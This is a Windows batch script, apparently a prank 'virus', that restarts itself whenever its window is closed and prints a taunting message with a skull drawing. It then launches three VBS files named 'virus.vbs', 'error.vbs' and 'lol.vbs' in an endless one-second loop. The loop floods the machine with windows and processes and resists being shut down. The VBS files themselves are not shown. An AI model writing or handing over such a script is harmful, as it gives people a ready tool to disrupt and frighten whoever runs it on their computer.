@echo off
color 47

if "%1" equ "Restarted" goto %1

:again
echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL
goto :again

:Restarted
echo LOL You Can't Close Me!
echo  @@@@@                                        @@@@@
echo @@@@@@@                                      @@@@@@@
echo @@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
echo  @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
echo      @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
echo        @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
echo          @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
echo             @@@@@@@    @@@@@@    @@@@@@
echo             @@@@@@      @@@@      @@@@@
echo             @@@@@@      @@@@      @@@@@
echo              @@@@@@    @@@@@@    @@@@@
echo               @@@@@@@@@@@  @@@@@@@@@@
echo                @@@@@@@@@@  @@@@@@@@@
echo            @@   @@@@@@@@@@@@@@@@@   @@
echo            @@@@  @@@@ @ @ @ @ @@@@  @@@@
echo           @@@@@   @@@ @ @ @ @ @@@   @@@@@
echo         @@@@@      @@@@@@@@@@@@@      @@@@@
echo       @@@@          @@@@@@@@@@@          @@@@
echo    @@@@@              @@@@@@@              @@@@@
echo   @@@@@@@                                 @@@@@@@
echo    @@@@@                                   @@@@@
:loop
start "here goes the virus!" "virus.vbs"
start "warned you!" "error.vbs"
start "still using your pc lol?" "lol.vbs"
timeout /T 1 > NUL
goto loop